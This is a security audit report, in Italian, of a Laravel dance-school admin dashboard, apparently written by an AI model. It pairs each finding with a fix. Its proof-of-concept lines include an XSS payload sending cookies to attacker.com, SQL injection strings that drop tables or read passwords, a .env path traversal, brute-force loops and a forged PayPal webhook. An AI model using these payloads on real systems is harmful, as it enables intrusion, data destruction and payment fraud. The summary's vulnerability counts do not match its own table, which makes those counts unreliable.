# SECURITY AUDIT REPORT - Admin Dashboard Scuola di Danza

**Data Audit:** 30 Settembre 2025
**Versione Applicazione:** Laravel 12
**Auditor:** Claude Security Expert
**Scope:** Admin Dashboard e funzionalità critiche

---

## EXECUTIVE SUMMARY

L'audit ha identificato **18 vulnerabilità di sicurezza**, di cui:
- **4 CRITICAL** - Richiedono immediata attenzione
- **8 HIGH** - Richiedono intervento prioritario
- **4 MEDIUM** - Da risolvere a breve termine
- **2 LOW** - Da risolvere a lungo termine

Le aree più critiche sono:
1. **PayPal Webhook Security** - Mancanza completa di verifica firma
2. **SQL Injection Risk** - Sorting non sanitizzato
3. **Mass Assignment Vulnerabilities** - Attributi sensibili esposti
4. **XSS in Blade Templates** - Uso di raw output in diversi template

---

## 1. AUTHENTICATION & AUTHORIZATION

### ✅ **PASSED - Role Middleware Implementation**
**File:** `/app/Http/Middleware/RoleMiddleware.php`

**Punti di forza:**
- Verifica corretta del ruolo utente
- Gestione Super Admin con accesso elevato
- Controllo account attivo prima dell'accesso
- Supporto API e Web authentication

**Raccomandazione MEDIUM:**
```php
// Riga 48-50: Super Admin bypass potrebbe essere troppo permissivo
// RACCOMANDAZIONE: Log degli accessi Super Admin
if ($user->isSuperAdmin()) {
    Log::info('SuperAdmin access', [
        'user_id' => $user->id,
        'role' => $role,
        'route' => $request->path()
    ]);
    return $next($request);
}
```

---

### ⚠️ **HIGH - School Ownership Middleware Weaknesses**
**File:** `/app/Http/Middleware/SchoolOwnership.php`

**VULNERABILITY #1: Incomplete Model Coverage**
**Severity:** HIGH
**CWE:** CWE-285 (Improper Authorization)

**Dettaglio:**
Il middleware `validateModelOwnership()` (linee 105-179) copre solo alcuni model:
- School, Course, User, CourseEnrollment, Payment, Document, MediaItem
- **MANCANO:** Event, EventRegistration, Ticket, Staff, StaffSchedule, Attendance

**Proof of Concept:**
```bash
# Un admin può accedere agli eventi di altre scuole
curl -X GET "http://localhost:8089/admin/events/999" \
  -H "Authorization: Bearer {admin_token_school_1}"
# Se l'evento 999 appartiene a school_2, l'accesso viene consentito
```

**Impatto:**
- Admin può visualizzare/modificare eventi di altre scuole
- Violazione segregazione dati multi-tenant
- Possibile data leakage tra scuole

**Fix Raccomandato:**
```php
// In SchoolOwnership.php, aggiungere ai case esistenti:
case 'App\Models\Event':
    if (($user->isAdmin() || $user->isStudent()) && $model->school_id !== $user->school_id) {
        $this->denyAccess($request, 'Event access denied');
    }
    break;

case 'App\Models\EventRegistration':
    if ($user->isAdmin() && $model->event->school_id !== $user->school_id) {
        $this->denyAccess($request, 'Event registration access denied');
    }
    if ($user->isStudent() && $model->user_id !== $user->id) {
        $this->denyAccess($request, 'Event registration access denied');
    }
    break;

case 'App\Models\Ticket':
    if ($user->isAdmin() && $model->school_id !== $user->school_id) {
        $this->denyAccess($request, 'Ticket access denied');
    }
    if ($user->isStudent() && $model->user_id !== $user->id) {
        $this->denyAccess($request, 'Ticket access denied');
    }
    break;

case 'App\Models\Staff':
    if ($user->isAdmin() && $model->school_id !== $user->school_id) {
        $this->denyAccess($request, 'Staff access denied');
    }
    break;

case 'App\Models\StaffSchedule':
    if ($user->isAdmin() && $model->staff->school_id !== $user->school_id) {
        $this->denyAccess($request, 'Staff schedule access denied');
    }
    break;

case 'App\Models\Attendance':
    $attendable = $model->attendable; // Course o Event
    if ($user->isAdmin() && $attendable->school_id !== $user->school_id) {
        $this->denyAccess($request, 'Attendance access denied');
    }
    if ($user->isStudent() && $model->user_id !== $user->id) {
        $this->denyAccess($request, 'Attendance access denied');
    }
    break;
```

**Priority:** HIGH - Implementare entro 7 giorni

---

### ✅ **PASSED - Global Scope Implementation**
**File:** `/app/Models/Payment.php` (linee 770-786)

**Punti di forza:**
- Global scope attivo per multi-tenant isolation
- Auto-assignment di school_id in creazione
- Filtro automatico per utenti non Super Admin

**Nota:** Global scope è **DISABILITATO** in `/app/Models/User.php` (linee 24-29)
**Raccomandazione:** Riattivare dopo testing approfondito

---

## 2. SQL INJECTION & DATABASE SECURITY

### 🔴 **CRITICAL - SQL Injection via Sorting Parameter**
**File:** `/app/Http/Controllers/Admin/AdminPaymentController.php`

**VULNERABILITY #2: Unvalidated Sort Parameters**
**Severity:** CRITICAL
**CWE:** CWE-89 (SQL Injection)

**Dettaglio:**
Linee 50-52 nel metodo `index()`:
```php
$sortField = $request->get('sort', 'payment_date');
$sortDirection = $request->get('direction', 'desc');
$query->orderBy($sortField, $sortDirection);
```

**Proof of Concept:**
```bash
# SQL Injection tramite parametro sort
curl "http://localhost:8089/admin/payments?sort=payment_date;DROP+TABLE+payments--&direction=desc"

# Information Disclosure
curl "http://localhost:8089/admin/payments?sort=(SELECT+password+FROM+users+WHERE+id=1)&direction=desc"
```

**Impatto:**
- SQL Injection completa
- Data exfiltration da altri database
- Potenziale DROP TABLE
- Bypass autenticazione

**Fix Raccomandato:**
```php
// AdminPaymentController.php - metodo index()
$allowedSortFields = [
    'payment_date', 'amount', 'status', 'payment_method',
    'created_at', 'updated_at', 'due_date', 'receipt_number'
];

$sortField = $request->get('sort', 'payment_date');
$sortField = in_array($sortField, $allowedSortFields) ? $sortField : 'payment_date';

$sortDirection = $request->get('direction', 'desc');
$sortDirection = in_array(strtolower($sortDirection), ['asc', 'desc']) ? $sortDirection : 'desc';

$query->orderBy($sortField, $sortDirection);
```

**Stesso problema trovato in:**
- `/app/Http/Controllers/Admin/AdminStudentController.php` (riga 382)
- `/app/Http/Controllers/Admin/AdminDocumentController.php` (riga 45-46)
- `/app/Http/Controllers/Admin/AdminBaseController.php` (riga 381-382)

**Priority:** CRITICAL - Fix immediato richiesto

---

### ✅ **PASSED - Eloquent ORM Usage**

**Punti di forza:**
- Uso corretto di Eloquent ORM in tutti i controller
- Nessuna raw query non parametrizzata trovata
- Utilizzo di prepared statements automatici

---

### ⚠️ **HIGH - Search Input Sanitization**
**File:** `/app/Http/Controllers/Admin/AdminPaymentController.php`

**VULNERABILITY #3: Like Wildcard Injection**
**Severity:** HIGH
**CWE:** CWE-89 (SQL Injection - Variant)

**Dettaglio:**
Linee 34-46 nel metodo `index()`:
```php
if ($request->filled('search')) {
    $searchTerm = $request->get('search');
    $query->where(function($q) use ($searchTerm) {
        $q->whereHas('user', function($subq) use ($searchTerm) {
            $subq->where('name', 'like', "%{$searchTerm}%")
```

**Problema:**
Input non sanitizzato per caratteri speciali LIKE (`%`, `_`)

**Proof of Concept:**
```bash
# Bypass ricerca - mostra tutti i record
curl "http://localhost:8089/admin/payments?search=%25"

# Information gathering - enumerazione nomi
curl "http://localhost:8089/admin/payments?search=A%25"
```

**Fix Raccomandato:**
```php
if ($request->filled('search')) {
    $searchTerm = $request->get('search');
    // Escape caratteri speciali LIKE
    $searchTerm = addcslashes($searchTerm, '%_');
    $searchTerm = trim($searchTerm);

    $query->where(function($q) use ($searchTerm) {
        // ... rest of code
    });
}
```

**Priority:** HIGH - Implementare entro 14 giorni

---

## 3. XSS (CROSS-SITE SCRIPTING)

### ⚠️ **MEDIUM - Raw HTML Output in Blade Templates**

**VULNERABILITY #4: Unescaped Output**
**Severity:** MEDIUM
**CWE:** CWE-79 (Cross-site Scripting)

**Files Affetti:**
- `/resources/views/admin/staff-schedules/show.blade.php`
- `/resources/views/admin/staff-schedules/edit.blade.php`
- `/resources/views/admin/staff-schedules/index.blade.php`

**Dettaglio:**
Uso di `{!! !!}` invece di `{{ }}` per output user-generated content

**Esempio Problematico:**
```blade
{!! $schedule->notes !!}
{!! $staff->description !!}
```

**Proof of Concept:**
```javascript
// Admin crea uno staff schedule con notes malevolo
notes: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"

// Quando altri admin visualizzano lo schedule, lo script viene eseguito
```

**Impatto:**
- Session hijacking
- Cookie theft
- Phishing attacks agli admin
- Keylogging

**Fix Raccomandato:**
```blade
<!-- Cambiare da {!! !!} a {{ }} -->
{{ $schedule->notes }}
{{ $staff->description }}

<!-- Se serve HTML, sanitizzare con libreria -->
{!! clean($schedule->notes, ['HTML.Allowed' => 'p,br,strong,em']) !!}
```

**Installare HTML Purifier:**
```bash
composer require mews/purifier
```

**Priority:** MEDIUM - Fix entro 21 giorni

---

### ✅ **PASSED - CSRF Protection**

**Punti di forza:**
- CSRF token presente in tutti i form
- Middleware VerifyCsrfToken attivo
- AJAX requests con X-CSRF-TOKEN header

---

## 4. FILE UPLOAD SECURITY

### ⚠️ **HIGH - Insufficient File Type Validation**
**File:** `/app/Http/Controllers/Admin/AdminDocumentController.php`

**VULNERABILITY #5: Weak MIME Type Validation**
**Severity:** HIGH
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Dettaglio:**
Linea 191 nel metodo `update()`:
```php
'file' => 'nullable|file|max:10240|mimes:pdf,jpg,jpeg,png,gif,doc,docx,txt',
```

**Problemi:**
1. Validazione solo su extension, non su contenuto reale
2. Mancanza di antivirus scanning
3. File eseguibili potrebbero bypassare controllo
4. Nessun controllo dimensione immagini (possibile DoS)

**Proof of Concept:**
```bash
# Upload file PHP mascherato da PDF
cp malicious.php evil.pdf
# Laravel validerà solo extension, non magic bytes
```

**Fix Raccomandato:**
```php
// 1. Validare MIME type reale
use Illuminate\Support\Facades\File;

$request->validate([
    'file' => [
        'nullable',
        'file',
        'max:10240',
        'mimes:pdf,jpg,jpeg,png,gif,doc,docx,txt',
        function ($attribute, $value, $fail) {
            $allowedMimes = [
                'application/pdf',
                'image/jpeg',
                'image/png',
                'image/gif',
                'application/msword',
                'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                'text/plain'
            ];

            $fileMime = File::mimeType($value->path());

            if (!in_array($fileMime, $allowedMimes)) {
                $fail("Il tipo di file non è permesso.");
            }
        },
    ]
]);

// 2. Rinominare file con hash
$filename = hash('sha256', time() . $file->getClientOriginalName()) . '.' . $extension;

// 3. Storage in disco privato (già implementato correttamente)
$filePath = $file->storeAs("documents/{$schoolId}/admin", $filename, 'private');

// 4. Scan antivirus (opzionale ma raccomandato)
// composer require xenolope/quahog
$scanner = new \Xenolope\Quahog\Client($socket);
$result = $scanner->scanFile($file->path());
if ($result['status'] !== 'OK') {
    throw new \Exception('File contains malware');
}
```

**Stesso problema in:**
- `/app/Http/Controllers/Admin/MediaGalleryController.php` (riga 203)

**Priority:** HIGH - Implementare entro 14 giorni

---

### ⚠️ **MEDIUM - Path Traversal in File Download**
**File:** `/app/Http/Controllers/Admin/AdminDocumentController.php`

**VULNERABILITY #6: Potential Path Traversal**
**Severity:** MEDIUM
**CWE:** CWE-22 (Path Traversal)

**Dettaglio:**
Linea 317 nel metodo `download()`:
```php
return Storage::disk('private')->download($document->file_path, $document->original_filename);
```

**Problema:**
Se `file_path` o `original_filename` sono compromessi nel DB, possibile path traversal

**Proof of Concept:**
```sql
-- Un attacker con accesso SQL modifica:
UPDATE documents SET file_path = '../../../.env' WHERE id = 123;

-- Download rivela segreti
curl "http://localhost:8089/admin/documents/123/download"
```

**Fix Raccomandato:**
```php
public function download(Document $document)
{
    // Verifica ownership (già presente)
    if ($document->school_id !== auth()->user()->school_id) {
        abort(404);
    }

    // Sanitizza path - rimuovi ../ e path assoluti
    $filePath = str_replace(['../', '..\\'], '', $document->file_path);
    $originalFilename = basename($document->original_filename);

    if (!$document->file_path || !Storage::disk('private')->exists($filePath)) {
        abort(404, 'File non trovato');
    }

    // Verifica che il file sia nella directory corretta
    $realPath = Storage::disk('private')->path($filePath);
    $basePath = Storage::disk('private')->path('documents/');

    if (strpos(realpath($realPath), realpath($basePath)) !== 0) {
        abort(403, 'Access denied');
    }

    return Storage::disk('private')->download($filePath, $originalFilename);
}
```

**Priority:** MEDIUM - Implementare entro 21 giorni

---

## 5. PAYPAL INTEGRATION SECURITY

### 🔴 **CRITICAL - Webhook Signature Verification Missing**
**File:** `/app/Http/Controllers/PayPalController.php` & `/app/Services/PayPalService.php`

**VULNERABILITY #7: Unverified Webhook Signatures**
**Severity:** CRITICAL
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)

**Dettaglio:**
Il webhook PayPal (linee 210-253 in PayPalController.php) **NON VERIFICA** la firma del webhook.

Linea 295-307 in PayPalService.php:
```php
public function verifyWebhook(array $headers, string $body): bool
{
    try {
        // TODO: Implementare verifica reale
        return true; // PLACEHOLDER - PERICOLOSO!
    }
}
```

**Proof of Concept:**
```bash
# Attacker invia webhook falso
curl -X POST "http://localhost:8089/paypal/webhook" \
  -H "Content-Type: application/json" \
  -d '{
    "event_type": "PAYMENT.SALE.COMPLETED",
    "resource": {
      "parent_payment": "PAY-FAKE123",
      "state": "completed"
    }
  }'

# Il payment viene marcato completed senza verifica
```

**Impatto:**
- Payment fraud - pagamenti marcati completed senza trasferimento denaro reale
- Bypass completo processo PayPal
- Perdite finanziarie dirette
- Iscrizioni gratuite fraudolente

**Fix Raccomandato:**
```php
// PayPalController.php - metodo webhook()
public function webhook(Request $request)
{
    try {
        $headers = $request->header();
        $body = $request->getContent();
        $data = json_decode($body, true);

        // VERIFICA FIRMA WEBHOOK
        $webhookId = config('paypal.webhook_id'); // Aggiungi in config/paypal.php

        $verification = [
            'auth_algo' => $headers['paypal-auth-algo'][0] ?? '',
            'cert_url' => $headers['paypal-cert-url'][0] ?? '',
            'transmission_id' => $headers['paypal-transmission-id'][0] ?? '',
            'transmission_sig' => $headers['paypal-transmission-sig'][0] ?? '',
            'transmission_time' => $headers['paypal-transmission-time'][0] ?? '',
            'webhook_id' => $webhookId,
            'webhook_event' => $data
        ];

        // Estrai school_id dal custom data
        $customData = json_decode($data['resource']['custom'] ?? '{}', true);
        $schoolId = $customData['school_id'] ?? null;

        if (!$schoolId) {
            Log::error('PayPal webhook missing school_id');
            return response('Missing school_id', 400);
        }

        $school = School::find($schoolId);
        $paypalService = PayPalService::forSchool($school);

        // VERIFICA FIRMA
        if (!$paypalService->verifyWebhookSignature($verification)) {
            Log::error('PayPal webhook signature verification failed', [
                'transmission_id' => $verification['transmission_id']
            ]);
            return response('Signature verification failed', 403);
        }

        // Processa solo se verificato
        if (!isset($data['event_type'])) {
            return response('Invalid webhook data', 400);
        }

        // ... resto del codice
    }
}
```

```php
// PayPalService.php - Implementare verifyWebhookSignature()
public function verifyWebhookSignature(array $verification): bool
{
    try {
        $this->client->setAccessToken($this->client->getAccessToken());

        $response = $this->client->verifyWebHook($verification);

        return isset($response['verification_status']) &&
               $response['verification_status'] === 'SUCCESS';
    } catch (Exception $e) {
        Log::error('PayPal webhook verification exception:', [
            'error' => $e->getMessage(),
            'school_id' => $this->school->id,
        ]);
        return false;
    }
}
```

**Configurazione Richiesta:**
```php
// config/paypal.php - Aggiungere
'webhook_id' => env('PAYPAL_WEBHOOK_ID', ''),

// .env
PAYPAL_WEBHOOK_ID=your-webhook-id-from-paypal-dashboard
```

**Priority:** CRITICAL - Fix IMMEDIATO (entro 48 ore)

---

### ⚠️ **HIGH - PayPal Credentials Exposure Risk**
**File:** `/app/Services/PayPalService.php`

**VULNERABILITY #8: Credentials in Database**
**Severity:** HIGH
**CWE:** CWE-522 (Insufficiently Protected Credentials)

**Dettaglio:**
Linee 28-39:
```php
$this->settings = [
    'client_id' => Setting::get("school.{$schoolId}.paypal.client_id", ''),
    'client_secret' => Setting::get("school.{$schoolId}.paypal.client_secret", ''),
```

**Problema:**
PayPal credentials stored in plain text nel database (tabella `settings`)

**Impatto:**
- SQL Injection può esporre credentials
- Database dump rivela client_secret
- Backup non cifrati espongono credentials
- Staff con accesso DB può rubare credentials

**Fix Raccomandato:**
```php
// 1. Cifrare credentials nel database
use Illuminate\Support\Facades\Crypt;

// Quando si salvano le impostazioni (AdminSettingsController):
Setting::set("school.{$schoolId}.paypal.client_secret", Crypt::encryptString($clientSecret));

// Quando si leggono (PayPalService):
$encryptedSecret = Setting::get("school.{$schoolId}.paypal.client_secret", '');
$clientSecret = $encryptedSecret ? Crypt::decryptString($encryptedSecret) : '';

// 2. OPPURE usare Laravel Vault (raccomandato per production)
// composer require spatie/laravel-vault

// 3. Implementare rotation automatica credentials
// 4. Loggare tutti gli accessi alle credentials
```

**Priority:** HIGH - Implementare entro 7 giorni

---

## 6. DATA EXPOSURE & PRIVACY

### ⚠️ **MEDIUM - Sensitive Data in Logs**

**VULNERABILITY #9: Excessive Logging**
**Severity:** MEDIUM
**CWE:** CWE-532 (Information Exposure Through Log Files)

**Files Affetti:**
- `/app/Http/Controllers/PayPalController.php` (riga 107)
- `/app/Services/PayPalService.php` (multiple occorrences)

**Dettaglio:**
```php
Log::error('Error creating PayPal payment:', [
    'error' => $e->getMessage(),
    'user_id' => Auth::id(),
    'request_data' => $request->all(), // PERICOLOSO - potrebbe contenere passwords, tokens
]);
```

**Problema:**
Logging completo di `$request->all()` può includere:
- Password utenti
- CSRF tokens
- Session tokens
- Dati sensibili carte credito

**Fix Raccomandato:**
```php
// Creare helper per sanitizzare log
// app/Helpers/LogHelper.php
class LogHelper
{
    public static function sanitizeRequest(array $data): array
    {
        $sensitiveKeys = [
            'password', 'password_confirmation', 'token', 'api_token',
            'client_secret', '_token', 'remember_token', 'card_number',
            'cvv', 'card_cvv', 'ssn', 'codice_fiscale'
        ];

        foreach ($sensitiveKeys as $key) {
            if (isset($data[$key])) {
                $data[$key] = '***REDACTED***';
            }
        }

        return $data;
    }
}

// Usare nei controller:
Log::error('Error creating PayPal payment:', [
    'error' => $e->getMessage(),
    'user_id' => Auth::id(),
    'request_data' => LogHelper::sanitizeRequest($request->all()),
]);
```

**Priority:** MEDIUM - Implementare entro 30 giorni

---

### ⚠️ **HIGH - Password Generation Predictability**
**File:** `/app/Http/Controllers/Admin/AdminStudentController.php`

**VULNERABILITY #10: Weak Password Generation**
**Severity:** HIGH
**CWE:** CWE-330 (Use of Insufficiently Random Values)

**Dettaglio:**
Linee 395-397:
```php
private function generateStudentPassword(): string
{
    return 'Student' . now()->year . str_pad(rand(100, 999), 3, '0', STR_PAD_LEFT);
}
```

**Problema:**
Pattern prevedibile: `Student2025XXX` (solo 900 combinazioni possibili)

**Proof of Concept:**
```python
# Brute force attack
for i in range(100, 1000):
    password = f"Student2025{i:03d}"
    attempt_login(email, password)
```

**Impatto:**
- Brute force attack facile
- Account takeover
- Accesso non autorizzato dati studenti

**Fix Raccomandato:**
```php
private function generateStudentPassword(): string
{
    // Genera password sicura random
    return Str::random(12); // 12 caratteri random

    // OPPURE password complessa leggibile
    $adjectives = ['Quick', 'Brave', 'Smart', 'Swift', 'Bright'];
    $nouns = ['Lion', 'Eagle', 'Tiger', 'Falcon', 'Dolphin'];
    $number = rand(1000, 9999);
    $special = ['!', '@', '#', '$', '%'][rand(0, 4)];

    return $adjectives[rand(0, 4)] . $nouns[rand(0, 4)] . $number . $special;
    // Es: QuickLion5847!
}
```

**Priority:** HIGH - Implementare entro 7 giorni

---

## 7. MASS ASSIGNMENT VULNERABILITIES

### ⚠️ **HIGH - Unguarded Model Attributes**

**VULNERABILITY #11: Over-Permissive $fillable**
**Severity:** HIGH
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)

**Files Affetti:**
- `/app/Models/User.php` (linee 45-61)
- `/app/Models/Payment.php` (linee 62-91)

**Dettaglio User Model:**
```php
protected $fillable = [
    'name', 'email', 'password', 'school_id', 'role', 'first_name',
    'last_name', 'phone', 'codice_fiscale', 'date_of_birth', 'address',
    'emergency_contact', 'medical_notes', 'profile_image_path', 'active',
];
```

**Problema:**
Attributi critici `school_id`, `role`, `active` sono fillable

**Proof of Concept:**
```bash
# Privilege escalation - student diventa admin
curl -X PATCH "http://localhost:8089/profile" \
  -H "Authorization: Bearer {student_token}" \
  -d '{
    "name": "John Doe",
    "role": "admin",
    "school_id": 1
  }'
```

**Impatto:**
- Privilege escalation (student → admin)
- School ID manipulation
- Account activation bypass
- Role assignment abuse

**Fix Raccomandato:**
```php
// User.php - Rimuovere attributi sensibili da $fillable
protected $fillable = [
    'name', 'email', 'first_name', 'last_name', 'phone',
    'date_of_birth', 'address', 'emergency_contact', 'medical_notes',
];

// Proteggere attributi sensibili
protected $guarded = [
    'password', 'school_id', 'role', 'active', 'email_verified_at',
    'remember_token', 'profile_image_path'
];

// Usare metodi dedicati per modifiche sensibili
public function assignRole(string $role)
{
    if (!in_array($role, self::getAllRoles())) {
        throw new \Exception('Invalid role');
    }
    $this->role = $role;
    $this->save();
}

public function setSchool(School $school)
{
    $this->school_id = $school->id;
    $this->save();
}
```

**Stesso problema in Payment Model:**
```php
// Payment.php - Proteggere attributi sensibili
protected $guarded = [
    'id', 'school_id', 'status', 'processed_by_user_id',
    'receipt_number', 'gateway_response'
];
```

**Priority:** HIGH - Implementare entro 7 giorni

---

## 8. RATE LIMITING & DOS PROTECTION

### ⚠️ **MEDIUM - Missing Rate Limiting on Admin Routes**

**VULNERABILITY #12: No Rate Limiting**
**Severity:** MEDIUM
**CWE:** CWE-770 (Allocation of Resources Without Limits)

**Dettaglio:**
Le routes admin in `/routes/web.php` (linee 115-300) **NON HANNO** rate limiting

**Attacco Possibile:**
```bash
# Brute force admin password
for i in {1..10000}; do
    curl -X POST "http://localhost:8089/login" \
      -d "email=admin@school.com&password=attempt$i"
done

# DoS via export massivi
for i in {1..1000}; do
    curl "http://localhost:8089/admin/payments/export" &
done
```

**Impatto:**
- Brute force attacks illimitati
- DoS tramite operazioni pesanti (export, PDF generation)
- Resource exhaustion
- Server crash

**Fix Raccomandato:**
```php
// routes/web.php - Aggiungere throttle middleware
Route::middleware(['auth', 'role:admin', 'school.ownership', 'throttle:60,1'])
    ->prefix('admin')
    ->name('admin.')
    ->group(function () {
        // ... existing routes
    });

// Per endpoints critici, rate limit più stringente
Route::middleware(['auth', 'role:admin', 'throttle:10,1'])
    ->prefix('admin')
    ->name('admin.')
    ->group(function () {
        // Export routes
        Route::get('/export/{type}', [AdminDashboardController::class, 'export']);
        Route::get('/payments/export', [AdminPaymentController::class, 'export']);

        // Bulk operations
        Route::post('/students/bulk-action', [AdminStudentController::class, 'bulkAction']);
        Route::post('/payments/bulk-action', [AdminPaymentController::class, 'bulkAction']);
    });

// Login throttle (già presente in auth.php, verificare sia attivo)
```

**Configurare in .env:**
```env
THROTTLE_REQUESTS_PER_MINUTE=60
THROTTLE_ADMIN_EXPORTS=10
```

**Priority:** MEDIUM - Implementare entro 30 giorni

---

## 9. SESSION MANAGEMENT

### ✅ **PASSED - Session Configuration**

**Punti di forza:**
- Session lifetime: 120 minuti (configurabile)
- Session encryption abilitabile
- CSRF protection attivo
- Secure cookies (https only) configurabile

**Raccomandazione LOW:**
```env
# .env - Hardening sessioni
SESSION_LIFETIME=60  # Ridurre a 60 minuti
SESSION_ENCRYPT=true  # Abilitare encryption
SESSION_SECURE_COOKIE=true  # Solo HTTPS (production)
SESSION_HTTP_ONLY=true  # Previene accesso JS
SESSION_SAME_SITE=strict  # Protezione CSRF aggiuntiva
```

---

## 10. INFORMATION DISCLOSURE

### ⚠️ **LOW - Debug Mode in Production**

**VULNERABILITY #13: Debug Information Leakage**
**Severity:** LOW
**CWE:** CWE-209 (Information Exposure Through an Error Message)

**Dettaglio:**
File `.env.example` mostra `APP_DEBUG=true`

**Raccomandazione:**
```env
# Production .env
APP_DEBUG=false
APP_ENV=production
LOG_LEVEL=warning  # Non debug

# Configurare error handling custom
# app/Exceptions/Handler.php
public function render($request, Throwable $exception)
{
    if ($request->expectsJson()) {
        return response()->json([
            'success' => false,
            'message' => 'An error occurred. Please try again later.',
            // NO stack trace in production
        ], 500);
    }

    return parent::render($request, $exception);
}
```

**Priority:** LOW - Verificare prima del deployment production

---

### ⚠️ **MEDIUM - Excessive Error Details**
**File:** Multiple controllers

**VULNERABILITY #14: Exception Message Exposure**
**Severity:** MEDIUM
**CWE:** CWE-209

**Dettaglio:**
Molti controller espongono messaggi eccezione completi:
```php
return response()->json([
    'success' => false,
    'message' => 'Errore: ' . $e->getMessage() // Espone dettagli interni
], 500);
```

**Fix Raccomandato:**
```php
// Creare custom exception handler
// app/Exceptions/SecureHandler.php
class SecureHandler
{
    public static function handle(\Exception $e, bool $isProduction = true): array
    {
        // Log completo per debugging
        Log::error('Application error', [
            'exception' => get_class($e),
            'message' => $e->getMessage(),
            'file' => $e->getFile(),
            'line' => $e->getLine(),
            'trace' => $e->getTraceAsString()
        ]);

        // Risposta sicura per utente
        if ($isProduction) {
            return [
                'success' => false,
                'message' => 'Si è verificato un errore. Riprova più tardi.',
                'error_code' => uniqid('ERR_')
            ];
        }

        // Solo in development
        return [
            'success' => false,
            'message' => $e->getMessage(),
            'trace' => $e->getTrace()
        ];
    }
}

// Usare nei controller:
catch (\Exception $e) {
    $response = SecureHandler::handle($e, config('app.env') === 'production');
    return response()->json($response, 500);
}
```

**Priority:** MEDIUM - Implementare entro 30 giorni

---

## 11. GDPR COMPLIANCE

### ⚠️ **MEDIUM - Missing Data Deletion Cascade**

**VULNERABILITY #15: Incomplete User Data Deletion**
**Severity:** MEDIUM
**CWE:** N/A (Privacy/GDPR)

**Dettaglio:**
La cancellazione user non elimina tutti i dati correlati:
- Payments riferiscono ancora user_id
- Documents mantengono riferimenti
- Attendance records persistono
- MediaItems mantengono uploader

**Fix Raccomandato:**
```php
// User.php Model - Aggiungere boot method
protected static function boot()
{
    parent::boot();

    static::deleting(function ($user) {
        // GDPR compliance - anonimizzare invece di eliminare
        // per mantenere integrità referenziale

        $anonymousData = [
            'name' => 'Deleted User',
            'email' => 'deleted_' . $user->id . '@deleted.local',
            'first_name' => 'Deleted',
            'last_name' => 'User',
            'phone' => null,
            'codice_fiscale' => null,
            'address' => null,
            'emergency_contact' => null,
            'medical_notes' => 'DELETED',
            'active' => false
        ];

        $user->update($anonymousData);

        // Elimina dati sensibili correlati
        $user->documents()->delete();
        $user->mediaItems()->update(['user_id' => null]);

        // Log per audit trail GDPR
        Log::info('User data anonymized for GDPR compliance', [
            'user_id' => $user->id,
            'requested_by' => auth()->id(),
            'timestamp' => now()
        ]);
    });
}
```

**Implementare GDPR export:**
```php
// User.php
public function exportPersonalData(): array
{
    return [
        'profile' => $this->only([
            'name', 'email', 'first_name', 'last_name',
            'phone', 'date_of_birth', 'address'
        ]),
        'enrollments' => $this->enrollments()->with('course')->get(),
        'payments' => $this->payments()->get(),
        'documents' => $this->documents()->get(),
        'attendance' => $this->attendance()->get(),
        'created_at' => $this->created_at,
        'updated_at' => $this->updated_at
    ];
}
```

**Priority:** MEDIUM - Implementare entro 30 giorni (obbligatorio per GDPR)

---

## 12. API SECURITY

### ⚠️ **LOW - Missing API Rate Limiting Granularity**

**VULNERABILITY #16: Coarse-Grained API Throttling**
**Severity:** LOW
**CWE:** CWE-770

**Dettaglio:**
File `/routes/api.php` ha throttling generico 60/min per tutte le API

**Raccomandazione:**
```php
// Throttling granulare per endpoint
Route::prefix('v1/payments')
    ->middleware(['auth:sanctum', 'throttle:10,1'])  // 10/min per payments
    ->group(function () {
        // Payment endpoints
    });

Route::prefix('v1/search')
    ->middleware(['auth:sanctum', 'throttle:30,1'])  // 30/min per search
    ->group(function () {
        // Search endpoints
    });

Route::prefix('v1/profile')
    ->middleware(['auth:sanctum', 'throttle:20,1'])  // 20/min per profile
    ->group(function () {
        // Profile endpoints
    });
```

**Priority:** LOW - Ottimizzazione futura

---

## VULNERABILITY SUMMARY TABLE

| # | Vulnerability | Severity | CWE | File | Priority | ETA Fix |
|---|--------------|----------|-----|------|----------|---------|
| 1 | Incomplete Model Coverage in SchoolOwnership | HIGH | CWE-285 | SchoolOwnership.php | HIGH | 7 giorni |
| 2 | SQL Injection via Sort Parameter | CRITICAL | CWE-89 | AdminPaymentController.php + others | CRITICAL | IMMEDIATO |
| 3 | Like Wildcard Injection | HIGH | CWE-89 | AdminPaymentController.php | HIGH | 14 giorni |
| 4 | XSS via Raw HTML Output | MEDIUM | CWE-79 | staff-schedules/*.blade.php | MEDIUM | 21 giorni |
| 5 | Weak File Type Validation | HIGH | CWE-434 | AdminDocumentController.php | HIGH | 14 giorni |
| 6 | Path Traversal in Download | MEDIUM | CWE-22 | AdminDocumentController.php | MEDIUM | 21 giorni |
| 7 | PayPal Webhook Signature Not Verified | CRITICAL | CWE-345 | PayPalController.php | CRITICAL | 48 ore |
| 8 | PayPal Credentials Plaintext Storage | HIGH | CWE-522 | PayPalService.php | HIGH | 7 giorni |
| 9 | Sensitive Data in Logs | MEDIUM | CWE-532 | Multiple controllers | MEDIUM | 30 giorni |
| 10 | Weak Password Generation | HIGH | CWE-330 | AdminStudentController.php | HIGH | 7 giorni |
| 11 | Mass Assignment on Sensitive Attributes | HIGH | CWE-915 | User.php, Payment.php | HIGH | 7 giorni |
| 12 | Missing Rate Limiting Admin Routes | MEDIUM | CWE-770 | web.php | MEDIUM | 30 giorni |
| 13 | Debug Mode Information Leakage | LOW | CWE-209 | .env configuration | LOW | Pre-production |
| 14 | Excessive Error Details Exposure | MEDIUM | CWE-209 | Multiple controllers | MEDIUM | 30 giorni |
| 15 | Incomplete GDPR Data Deletion | MEDIUM | Privacy | User.php | MEDIUM | 30 giorni |
| 16 | Coarse API Throttling | LOW | CWE-770 | api.php | LOW | Futuro |

---

## REMEDIATION PRIORITY ROADMAP

### IMMEDIATE (48 hours)
1. **FIX #7**: Implementare PayPal webhook signature verification
2. **FIX #2**: Validare parametri sort in tutti i controller

### WEEK 1 (7 giorni)
3. **FIX #1**: Completare SchoolOwnership middleware con tutti i model
4. **FIX #8**: Cifrare PayPal credentials in database
5. **FIX #10**: Migliorare generazione password studenti
6. **FIX #11**: Proteggere mass assignment su User e Payment

### WEEK 2 (14 giorni)
7. **FIX #3**: Sanitizzare input search per Like queries
8. **FIX #5**: Implementare validazione file robusta

### WEEK 3 (21 giorni)
